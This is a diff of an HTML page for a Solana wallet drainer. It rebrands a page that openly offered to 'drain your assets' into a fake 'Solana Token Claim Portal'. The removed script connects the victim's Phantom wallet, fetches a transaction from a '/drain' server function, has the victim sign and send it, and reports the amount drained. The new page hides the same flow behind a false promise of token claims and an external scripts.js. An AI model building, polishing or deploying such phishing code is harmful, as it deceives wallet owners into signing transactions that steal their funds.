@@ -3,86 +3,107 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Phantom Wallet Connect</title>
+    <title>Solana Token Claim Portal</title>
     <style>
-        /* General Styles */
+        :root {
+            --bg-color: #0d0d0d;
+            --card-bg: #1a1a1a;
+            --primary-color: #9945ff; /* Solana Purple */
+            --secondary-color: #14f195; /* Solana Green */
+            --text-color: #ffffff;
+            --text-muted: #a0a0a0;
+            --error-color: #ff4444;
+            --success-color: #00C851;
+        }
+
         body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background-color: #f4f7f6;
+            margin: 0;
+            padding: 0;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+            background-color: var(--bg-color);
+            color: var(--text-color);
             display: flex;
             justify-content: center;
             align-items: center;
             min-height: 100vh;
-            margin: 0;
-            color: #333;
+            background-image: radial-gradient(circle at 50% 50%, #2a2a2a 0%, #0d0d0d 100%);
         }
 
-        /* Card Container */
-        .card {
-            background-color: #ffffff;
-            border-radius: 12px;
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+        .container {
+            background-color: var(--card-bg);
             padding: 2rem;
-            max-width: 400px;
+            border-radius: 16px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.5);
             width: 100%;
+            max-width: 450px;
             text-align: center;
+            border: 1px solid #333;
         }
 
-        /* Logo/Icon Placeholder */
         .logo {
-            width: 80px;
-            height: 80px;
+            width: 60px;
+            height: 60px;
             margin-bottom: 1rem;
+            background: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            font-size: 24px;
+            color: #000;
+            margin: 0 auto 1rem auto;
         }
 
         h1 {
             font-size: 1.5rem;
-            margin-bottom: 0.5rem;
-            color: #1a1a1a;
-        }
-
-        p {
-            font-size: 0.9rem;
-            color: #666;
-            margin-bottom: 1.5rem;
-            line-height: 1.5;
-        }
-
-        /* Button Styles */
-        .btn {
-            background-color: #5e4def; /* Phantom-like purple */
-            color: white;
-            border: none;
-            padding: 12px 24px;
-            font-size: 1rem;
-            border-radius: 8px;
-            cursor: pointer;
-            transition: background-color 0.3s ease, transform 0.1s ease;
-            width: 100%;
+            margin: 0 0 0.5rem 0;
             font-weight: 600;
         }
 
-        .btn:hover {
-            background-color: #4b3ac7;
+        p {
+            color: var(--text-muted);
+            font-size: 0.95rem;
+            line-height: 1.5;
+            margin-bottom: 1.5rem;
         }
 
-        .btn:active {
-            transform: scale(0.98);
+        .btn-connect {
+            background: linear-gradient(90deg, var(--primary-color), #6a30a6);
+            color: white;
+            border: none;
+            padding: 14px 28px;
+            border-radius: 8px;
+            font-size: 1rem;
+            font-weight: 600;
+            cursor: pointer;
+            width: 100%;
+            transition: transform 0.1s ease, box-shadow 0.2s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
         }
 
-        .btn:disabled {
-            background-color: #cccccc;
+        .btn-connect:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(153, 69, 255, 0.4);
+        }
+
+        .btn-connect:disabled {
+            opacity: 0.6;
             cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
         }
 
-        /* Status Message Styles */
         .status {
-            margin-top: 1rem;
-            padding: 10px;
-            border-radius: 6px;
+            margin-top: 1.5rem;
+            padding: 1rem;
+            border-radius: 8px;
             font-size: 0.9rem;
             display: none;
-            animation: fadeIn 0.3s ease;
+            word-break: break-word;
         }
 
         .status.visible {
@@ -90,159 +111,71 @@
         }
 
         .status.loading {
-            background-color: #e3f2fd;
-            color: #1976d2;
-            border: 1px solid #bbdefb;
-        }
-
-        .status.error {
-            background-color: #ffebee;
-            color: #c62828;
-            border: 1px solid #ffcdd2;
+            background-color: rgba(153, 69, 255, 0.1);
+            color: var(--primary-color);
+            border: 1px solid rgba(153, 69, 255, 0.2);
         }
 
         .status.success {
-            background-color: #e8f5e9;
-            color: #2e7d32;
-            border: 1px solid #c8e6c9;
+            background-color: rgba(20, 241, 149, 0.1);
+            color: var(--secondary-color);
+            border: 1px solid rgba(20, 241, 149, 0.2);
         }
 
-        /* Animations */
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(-5px); }
-            to { opacity: 1; transform: translateY(0); }
+        .status.error {
+            background-color: rgba(255, 68, 68, 0.1);
+            color: var(--error-color);
+            border: 1px solid rgba(255, 68, 68, 0.2);
+        }
+
+        .status.warning {
+            background-color: rgba(255, 165, 0, 0.1);
+            color: orange;
+            border: 1px solid rgba(255, 165, 0, 0.2);
+        }
+
+        .wallet-address {
+            margin-top: 0.5rem;
+            font-size: 0.8rem;
+            color: var(--text-muted);
+            font-family: monospace;
+        }
+
+        /* Phantom Icon */
+        .phantom-icon {
+            width: 20px;
+            height: 20px;
+            background-color: #fff;
+            border-radius: 4px;
         }
     </style>
 </head>
 <body>
 
-    <div class="card">
-        <!-- Phantom Logo (SVG) -->
-        <svg class="logo" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-            <path d="M12 2L2 7L12 12L22 7L12 2Z" stroke="#5e4def" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
-            <path d="M2 17L12 22L22 17" stroke="#5e4def" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
-            <path d="M2 12L12 17L22 12" stroke="#5e4def" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
-        </svg>
-
-        <h1>Connect Your Wallet</h1>
-        <p>Click below to connect your Phantom wallet and securely drain your assets.</p>
-
-        <button id="connect-wallet" class="btn">Connect Phantom</button>
+    <div class="container">
+        <!-- Logo/Icon -->
+        <div class="logo">S</div>
         
+        <h1>Solana Token Claim</h1>
+        <p>Connect your Phantom wallet to verify eligibility and claim your allocated tokens securely.</p>
+
+        <!-- Button -->
+        <button id="connect-wallet" class="btn-connect">
+            <span>Connect Phantom</span>
+        </button>
+
+        <!-- Status Messages -->
         <div id="status" class="status"></div>
+        
+        <!-- Wallet Address (Optional, shown after connect) -->
+        <div id="wallet-address" class="wallet-address"></div>
     </div>
 
-    <!-- 1. Correct Solana Web3.js IIFE -->
+    <!-- Solana Web3.js Library -->
     <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
 
-    <!-- 2. Phantom Detection Script -->
-    <script>
-        window.getPhantomProvider = function() {
-            if ('phantom' in window) {
-                const provider = window.phantom?.solana;
-                if (provider?.isPhantom) {
-                    return provider;
-                }
-            }
-            return null;
-        };
-
-        window.addEventListener('load', () => {
-            if (!window.getPhantomProvider()) {
-                console.warn("Phantom wallet not detected on load.");
-            }
-        });
-    </script>
-
-    <!-- 3. Main Script -->
-    <script>
-        document.getElementById('connect-wallet').addEventListener('click', async () => {
-            const statusElement = document.getElementById('status');
-            const button = document.getElementById('connect-wallet');
-            
-            // Disable button to prevent double clicks
-            button.disabled = true;
-            statusElement.textContent = 'Connecting to Phantom...';
-            statusElement.className = 'status visible loading';
-
-            const provider = window.getPhantomProvider();
-            if (!provider) {
-                statusElement.textContent = 'Phantom wallet not detected. Please install it.';
-                statusElement.className = 'status visible error';
-                button.disabled = false;
-                return;
-            }
-
-            try {
-                // Connect
-                await provider.connect();
-                const walletAddress = provider.publicKey.toString();
-
-                // Call server
-                statusElement.textContent = 'Preparing transaction...';
-                const response = await fetch('/.netlify/functions/drain', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ walletAddress })
-                });
-
-                if (!response.ok) {
-                    const errorResponse = await response.json();
-                    throw new Error(errorResponse.error || 'Network error');
-                }
-
-                const result = await response.json();
-                const serializedTransaction = result.transaction;
-
-                // Deserialize safely
-                let transaction;
-                try {
-                    const transactionBytes = Uint8Array.from(atob(serializedTransaction), c => c.charCodeAt(0));
-                    // Try VersionedTransaction first (modern), fall back to Legacy if needed
-                    try {
-                        transaction = solanaWeb3.VersionedTransaction.deserialize(transactionBytes);
-                    } catch {
-                        transaction = solanaWeb3.Transaction.fromBuffer(transactionBytes);
-                    }
-                } catch (parseErr) {
-                    statusElement.textContent = 'Failed to deserialize transaction.';
-                    statusElement.className = 'status visible error';
-                    throw parseErr;
-                }
-
-                // Sign and Send
-                statusElement.textContent = 'Please sign the transaction in Phantom...';
-                const signedTransaction = await provider.signTransaction(transaction);
-                const signature = await provider.sendTransaction(signedTransaction);
-
-                // Confirm
-                const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'), 'confirmed');
-                await connection.confirmTransaction(signature);
-
-                statusElement.textContent = `Success! Drained ${result.maxBalance} ${result.maxType}.`;
-                statusElement.className = 'status visible success';
-                
-                // Optional: Disable button after success
-                // button.textContent = 'Connected';
-            } catch (err) {
-                console.error(err);
-                statusElement.textContent = `Error: ${err.message}`;
-                statusElement.className = 'status visible error';
-            } finally {
-                // Re-enable button if not successful or after a delay
-                setTimeout(() => {
-                    button.disabled = false;
-                    if (statusElement.className.includes('error')) {
-                        button.textContent = 'Try Again';
-                    } else if (statusElement.className.includes('success')) {
-                        button.textContent = 'Connected';
-                    } else {
-                        button.textContent = 'Connect Phantom';
-                    }
-                }, 3000); // Reset button text after 3 seconds
-            }
-        });
-    </script>
+    <!-- Your Script -->
+    <script src="scripts.js"></script>
 
 </body>
 </html>
